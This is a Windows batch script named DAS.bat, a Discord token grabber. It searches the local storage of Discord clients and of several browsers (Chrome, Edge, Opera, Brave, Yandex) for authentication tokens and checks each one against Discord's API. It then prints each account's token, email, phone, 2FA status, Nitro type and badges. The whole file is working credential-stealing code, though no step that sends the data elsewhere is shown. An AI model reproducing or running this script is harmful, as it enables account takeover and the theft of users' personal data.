@echo off
setlocal enabledelayedexpansion
chcp 437 >nul

REM ---------------------------------------------------------------
REM  DAS.bat - JavaScript NodeJS Replicate in batch (AKA DAS.exe)
REM             Compatible Versions : 3.0 3.1 3.2 3.3
REM ---------------------------------------------------------------
set builds=

:: SETTINGS
set "env.appdata=!appdata!"
set "env.localappdata=!localappdata!"
set TokensCount=0
set BuildsCount=0
set "ParseAccountInfo=id username avatar discriminator public_flags flags banner banner_color accent_color locale nsfw_allowed mfa_enabled premium_type email verified phone"

ping -n 1 discord.com | findstr /c:"TTL">nul || (
    echo ERROR=No connection.
    exit /b
)

for %%a in (
    "Stable|!ENV.APPDATA!\Discord"
    "PTB|!ENV.APPDATA!\discordptb"
    "Canary|!ENV.APPDATA!\discordcanary"
    "Developer|!ENV.APPDATA!\discorddevelopment"
    "LightCord|!ENV.APPDATA!\Lightcord"

    "Opera|!ENV.APPDATA!\Opera Software\Opera Stable"
    "OperaGX|!ENV.APPDATA!\Opera Software\Opera GX Stable"
    "Chrome|!ENV.LOCALAPPDATA!\Google\Chrome\User Data\Default"
    "Edge|!ENV.LOCALAPPDATA!\Microsoft\Edge\User Data\Default"
    "Yandex|!ENV.LOCALAPPDATA!\Yandex\YandexBrowser\User Data\Default"
    "Brave|!ENV.LOCALAPPDATA!\BraveSoftware\Brave-Browser\User Data\Default"
) do (
    for /f "tokens=1,2* delims=|" %%b in ("%%~a") do (
        if exist "%%c\Local Storage\leveldb\%%d" set /a BuildsCount+=1

        set All=
        for %%d in (ldb log) do (
            for /f "delims=" %%e in ('dir /b "%%c\Local Storage\leveldb\*.%%d" 2^>nul') do set All=%%e !All!
        )

        for %%d in (!All!) do (
        if exist "%%c\Local Storage\leveldb\%%d" (
            for /f "delims=" %%e in ('powershell "$data = Get-Content -Encoding UTF8 -Path '%%c\Local Storage\leveldb\%%d' ; $regex = [regex] '[\w-]{24}\.[\w-]{6}\.[\w-]{27}' ; $match = $regex.Match($data) ; ($match).value ; $data1 = Get-Content -Encoding UTF8 -Path '%%c\Local Storage\leveldb\%%d' ; $regex1 = [regex] 'mfa\.[\w-]{84}' ; $match1 = $regex1.Match($data1) ; ($match1).value"') do (
                    set "AllTokens=!AllTokens! "%%~b`%%e""
                    set /a TokensCount+=1
                )
            )
        )
    )
)

set Temp.AllTokens=!AllTokens!
for %%a in (!AllTokens!) do (
    for /f "tokens=1,2* delims=`" %%b in (%%a) do (
        echo:!Temp.AllTokens! | findstr /c:"%%c">nul && (
            set "FilteredTokens=!FilteredTokens! "%%b=%%c""
            set Temp.AllTokens=!Temp.AllTokens:"%%b`%%c"=!
        )
    )
)

if !BuildsCount! leq 0 (
    echo ERROR=Discord not installed
    exit /b
)

if !TokensCount! leq 0 (
    echo ERROR=User is not logged in
    exit /b
)

REM -- Duplications Remover & User Prepare --
for %%a in (!FilteredTokens!) do (
    for /f "tokens=1,2* delims==" %%b in (%%a) do (
        curl.exe -ksX GET --header "authorization: %%c" "https://discord.com/api/v7/users/@me" -o "%temp%\JsonDetail.json"
        findstr /c:"401: Unauthorized" "%temp%\JsonDetail.json">nul || (
            REM --- Valid Discord Token ---
            if not "!Temp.BuildAdded_%%b!"=="true" (
                for %%z in (!ParseAccountInfo!) do set %%z=
                call :JsonParse "%temp%\JsonDetail.json" !ParseAccountInfo!
                del /s /q "%temp%\JsonDetail.json">NUL

                if not defined Json.avatar call :RndProfilePicture
                if "!Json.avatar:~0,2!"=="a_" (set AvatarExt=gif) else (set AvatarExt=png)
                if "!Json.avatar:://=!"=="!Json.avatar!" (
                    set "Json.ImageURL=https://cdn.discordapp.com/avatars/!Json.id!/!Json.avatar!.!AvatarExt!"
                )

                for /f "delims=" %%a in ('powershell "$msSinceEpoch = ((!Json.id! -shr 22) + 1420070400000);[int]$secondsSinceEpoch = $msSinceEpoch / 1000;$dt = [DateTime]::new(1970, 1, 1, 0, 0, 0, 0, 'Utc').AddMilliseconds($msSinceEpoch);""$($dt.ToLocalTime().ToString('dd/MM/yyyy HH:mm:ss')) <t:$secondsSinceEpoch`:R>"""') do (
                    set "Json.CreatedAt=%%a"
                )

                call :GetBadges "!Json.flags!"

                if not defined Json.premium_type (
                    set Json.premium_type=No Nitro
                ) else (
                    if !Json.premium_type! equ 2 (
                        set Json.premium_type=Nitro With 2x Boosts
                        set "HasBadge=!HasBadge! <:NITRO:928924838805004308> <:boosting_1:928924639713976380>"
                        REM BOOSTING BADGE IS OF 3 FIRST MONTHS CURRENTLY
                    ) else (
                        set Json.premium_type=Nitro Classic
                        set "HasBadge=!HasBadge! <:NITRO:928924838805004308>"
                    )
                )

                if not defined HasBadge set "HasBadge= :x:"

                for %%a in (banner_color accent_color bio phone nsfw_allowed email) do (
                    if not defined Json.%%a set Json.%%a=null
                )

                set "AllUserIds=!AllUserIds! "%%b=!Json.id!""

                REM --- Add Discord User to array---
                for %%d in (
                    "Discord_%%b_Token=%%c"
                    "Discord_%%b_ID=!Json.id!"
                    "Discord_%%b_CreationDate=!Json.CreatedAt!"
                    "Discord_%%b_User=!Json.username!#!Json.discriminator!"
                    "Discord_%%b_Email=!Json.email!"
                    "Discord_%%b_Verified=!Json.verified!"
                    "Discord_%%b_Phone=!Json.phone!"
                    "Discord_%%b_2FA=!Json.mfa_enabled!"
                    "Discord_%%b_NSFW=!Json.nsfw_allowed!"
                    "Discord_%%b_Nitro=!Json.premium_type!"
                    "Discord_%%b_Badges=!HasBadge:~1!"
                    "Discord_%%b_ImageURL=!Json.ImageURL!"
                ) do set "build[%%b]=!build[%%b]! %%d"
                set /a ValidAccounts+=1
            )
            set Temp.BuildAdded_%%b=true
        )
    )
)

if !ValidAccounts! leq 0 (
    echo ERROR=User is not logged in
    exit /b
)

for %%a in (!AllUserIds!) do (
    for /f "tokens=1,2* delims==" %%b in (%%a) do (
        echo !AllUserIds! | findstr /c:"%%c">nul && (
            set builds=!builds! %%b
            set /a Accounts+=1
            set AllUserIds=!AllUserIds:%%c=!
        )
    )
)

echo Accounts=!Accounts!
for %%a in (!builds!) do for %%b in (!build[%%a]!) do echo %%~b
endlocal
exit /b

:: ADDON \ RANDOM DEFAULT IMAGE
:RndProfilePicture
set /a x=%RANDOM% * 5 / 32768 + 1
for /L %%a in (1 1 !x!) do (
    for %%b in (
        "7c8f476123d28d103efe381543274c25"
        "1cbd08c76f8af6dddce02c5138971129"
        "c09a43a372ba81e3018c3151d4ed4773"
        "6f26ddd1bf59740c536d2274bb834a05"
        "1f0bfc0865d324c2587920a7d80c609b"
    ) do (
        if %%a equ !x! set "Json.ImageURL=https://discord.com/assets/%%~b.png"
    )
)
exit /b

:: ADDON \ GET BADGES OF ACCOUNT
:GetBadges <API Number>
set HasBadge=
set "Json.flags=%~1"
for %%a in (
    "524288`BOT_HTTP_INTERACTIONS"
    "262144`<:CERTIFIED_MODERATOR:928924838469447691>"
    "131072`<:VERIFIED_DEVELOPER:928924838834348092>"
    "65536`VERIFIED_BOT"
    "16384`<:BUG_HUNTER_LEVEL_2:928924737877471242>"
    "1024`TEAM_PSEUDO_USER"
    "512`<:PREMIUM_EARLY_SUPPORTER:928924838591090699>"
    "256`<:HYPESQUAD_ONLINE_HOUSE_3:928924838817579028>"
    "128`<:HYPESQUAD_ONLINE_HOUSE_2:928924838821765150>"
    "64`<:HYPESQUAD_ONLINE_HOUSE_1:928924838872096788>"
    "8`<:BUG_HUNTER_LEVEL_1:928924737869053972>"
    "4`<:HYPESQUAD:928924838809206794>"
    "2`<:PARTNER:928924838880481320>"
    "1`<:STAFF:928924838834348093>"
) do (
    for /f "tokens=1,2 delims=`" %%b in (%%a) do (
        set /a "GetBadge=!Json.flags! & %%b"
        if !GetBadge! equ %%b set "HasBadge=!HasBadge! %%c"
    )
)
exit /b

:: ADDON \ PARSE JSON KEYS FROM FILE
:JsonParse <Json file> <Json keys to parse>
for %%a in ("ParseSource" "JsonKeys" "Arg[2]" "ParseKeys") do set %%~a=
set "ParseSource=%~1"
set "JsonKeys=%*"
set "JsonKeys=!JsonKeys:*%~1=!"
set "JsonKeys=!JsonKeys:~1!"
if exist "!ParseSource!" (
    for %%a in (!JsonKeys!) do (
        set "ParseKeys=!ParseKeys!; $ValuePart = '%%~a=' + $Value.%%~a ; $ValuePart"
    )
    for /f "delims=" %%a in ('powershell "$Value = (Get-Content '!ParseSource!' | Out-String | ConvertFrom-Json) !ParseKeys!"') do set "Json.%%a"
) else echo ERROR: File not found.
exit /b